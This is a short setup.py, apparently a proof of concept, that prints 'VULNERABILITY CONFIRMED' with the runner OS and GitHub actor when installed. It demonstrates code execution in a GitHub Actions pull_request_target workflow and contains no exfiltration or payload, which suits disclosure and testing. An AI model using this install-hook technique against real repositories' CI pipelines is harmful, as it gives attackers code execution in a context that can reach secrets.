from setuptools import setup
import sys
import os

# Writing to stderr ensures the message appears even if stdout is captured
sys.stderr.write("\n" + "!"*50 + "\n")
sys.stderr.write("VULNERABILITY CONFIRMED: setup.py is running in pull_request_target\n")
sys.stderr.write(f"Runner OS: {os.environ.get('RUNNER_OS')}\n")
sys.stderr.write(f"Actor: {os.environ.get('GITHUB_ACTOR')}\n")
sys.stderr.write("!"*50 + "\n\n")

setup(
    name="poc-package",
    version="0.0.1",
)
